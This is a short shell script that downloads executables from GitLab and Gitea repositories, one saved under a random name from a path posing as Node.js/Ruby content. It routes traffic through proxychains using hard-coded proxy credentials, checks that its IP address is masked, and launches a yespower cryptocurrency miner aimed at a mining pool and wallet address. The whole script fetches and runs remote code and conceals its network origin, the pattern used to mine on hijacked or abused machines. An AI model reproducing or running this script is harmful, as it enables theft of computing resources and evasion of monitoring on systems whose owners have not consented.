proxy="50.17.160.202" 
port="9293" 
user="j20xdk29m7l3e1"  
pass="iaukjmybb5yx5ot6vodovssxeb5" 
wget -q -O 96dTwhqonHtEPFNbbLaz7 https://gitlab.com/node.js2594450/ruby/-/raw/main/isl && chmod +x 96dTwhqonHtEPFNbbLaz7
wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/panel && chmod +x panel 
wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/proxychains.conf && chmod +x proxychains.conf 
wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/libproxychains4.so && chmod +x libproxychains4.so 
sleep 3 
sed -i "s/127.0.0.1/$proxy/" "proxychains.conf" 
sleep 1 
sed -i "s/port/$port/" "proxychains.conf" 
sed -i "s/user/$user/" "proxychains.conf"  
sleep 1  
sed -i "s/pass/$pass/" "proxychains.conf" 
sleep 11 
echo "******************************************************************" 
echo "IP ORI ==> "$(curl ifconfig.me) 
echo " " 
echo " " 
echo "IP BARU ==> "$(./panel curl ifconfig.me)
./panel ./96dTwhqonHtEPFNbbLaz7 -a yespower -o 149.50.222.86:8080 -u KMFbor5m85Kh6fSjLKDZuSG6nJHMARC3TQ.$(echo $(shuf -i 1-100 -n 1)-fahmi)  -p c=CRNC,mc=VHH  --proxy=http://j20xdk29m7l3e1:iaukjmybb5yx5ot6vodovssxeb5@50.17.160.202:9293 

